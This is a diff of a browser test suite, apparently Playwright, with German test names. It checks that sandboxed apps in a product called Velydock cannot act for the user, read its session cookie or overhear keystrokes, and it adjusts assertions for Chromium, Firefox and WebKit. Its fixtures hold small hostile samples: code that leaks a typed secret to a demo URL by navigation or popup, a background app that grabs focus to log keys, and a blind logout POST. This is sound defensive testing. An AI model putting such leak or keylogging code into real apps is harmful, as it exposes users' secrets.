@@ -69,15 +69,16 @@ test.describe('Eigene Apps sind vom Rest isoliert', () => {
     await context.close();
   });
 
-  test('auch mit Netzwerkzugriff gehen keine Anmeldedaten an Velydock und nichts wird ausgelöst', async ({ browser }) => {
+  test('auch mit Netzwerkzugriff führt Velydock nichts im Namen des Benutzers aus', async ({ browser }) => {
     const { apps } = world();
     const context = await contextAs(browser, 'mia');
     const page = await context.newPage();
-    const toVelydock: { url: string; cookie: string | undefined; method: string }[] = [];
-    page.on('request', async (request) => {
-      const frame = request.frame();
-      if (frame !== page.mainFrame() && request.url().startsWith(`${DOCK_URL}/api/`)) {
-        toVelydock.push({ url: request.url(), method: request.method(), cookie: (await request.allHeaders()).cookie });
+    const toVelydock: { url: string; method: string; status: number; cookie: boolean }[] = [];
+    page.on('response', async (response) => {
+      const request = response.request();
+      if (request.frame() !== page.mainFrame() && request.url().startsWith(`${DOCK_URL}/api/`)) {
+        const cookie = ((await request.allHeaders()).cookie ?? '').includes('velydock_session');
+        toVelydock.push({ url: request.url(), method: request.method(), status: response.status(), cookie });
       }
     });
     const probe = await runProbe(page, apps.netNotes);
@@ -85,9 +86,13 @@ test.describe('Eigene Apps sind vom Rest isoliert', () => {
     expect(probe.origin).toBe('null');
     // Reading the API fails (no CORS permission) …
     expect(probe.api).toMatch(/^BLOCKED:/);
-    // … and the requests that did leave the frame carried no session cookie.
+    // … and none of the requests that did leave the frame was carried out as the user. Chromium
+    // and Firefox do not attach the session cookie to requests of a sandboxed frame. WebKit
+    // does - there it is the server that refuses, because the request comes from another origin.
     expect(toVelydock.length).toBeGreaterThan(0);
-    for (const request of toVelydock) expect(request.cookie ?? '', request.url).not.toContain('velydock_session');
+    for (const request of toVelydock) {
+      expect([401, 403], `${request.method} ${request.url} (cookie ${request.cookie ? 'sent' : 'not sent'})`).toContain(request.status);
+    }
     // The blind POST to the logout endpoint changed nothing: the user is still signed in.
     expect((await page.request.get('/api/v1/me')).status()).toBe(200);
     for (const capability of ['cookie', 'localStorage', 'parentDocument', 'topNavigation']) {
@@ -158,7 +163,9 @@ test.describe('Eigene Apps sind vom Rest isoliert', () => {
       const secret = 'eingetipptes-geheimnis';
       document.getElementById('nav').onclick = () => { location.href = '${DEMO_URL}/?leak=nav-' + secret; };
       document.getElementById('popup').onclick = () => {
-        const opened = window.open('${DEMO_URL}/?leak=popup-' + secret);
+        // Refused differently by the engines: Chromium and WebKit return null, Firefox throws.
+        let opened = null;
+        try { opened = window.open('${DEMO_URL}/?leak=popup-' + secret); } catch { opened = null; }
         document.getElementById('state').textContent = opened ? 'geöffnet' : 'kein Fenster';
       };`;
     const anna = await apiAs('anna');
@@ -214,7 +221,7 @@ test.describe('Eigene Apps sind vom Rest isoliert', () => {
     }
   });
 
-  test('eine App im Hintergrund liest nicht mit, was auf einer Velydock-Seite getippt wird', async ({ browser }) => {
+  test('eine App im Hintergrund liest nicht mit, was auf einer Velydock-Seite getippt wird', async ({ browser, browserName }) => {
     // Opened apps stay loaded while another page is shown. This one lies low for a few seconds,
     // then pulls the keyboard focus to itself several times a second and reports every key it
     // sees. It has network access, so that it could tell the world - the test listens for that.
@@ -272,9 +279,15 @@ test.describe('Eigene Apps sind vom Rest isoliert', () => {
       await expect(field).toHaveValue(typed);
       await page.waitForTimeout(600);
       expect(overheard.join(''), 'keys that reached the app in the background').toBe('');
-      // It kept trying, so Velydock closed it and says so.
-      await expect(appFrame(page, thief)).toHaveCount(0);
-      await expect(page.getByTestId('toast').filter({ hasText: name })).toContainText('Tastatureingabe');
+      if (browserName === 'firefox') {
+        // Firefox does not let a frame that is not rendered take the focus in the first place:
+        // there was nothing to take back, and the app is still loaded.
+        await expect(appFrame(page, thief)).toHaveCount(1);
+      } else {
+        // Chromium and WebKit do. It kept trying, so Velydock closed it and says so.
+        await expect(appFrame(page, thief)).toHaveCount(0);
+        await expect(page.getByTestId('toast').filter({ hasText: name })).toContainText('Tastatureingabe');
+      }
     } finally {
       await context.close();
       await anna.delete(`/api/v1/admin/apps/${thief}`);
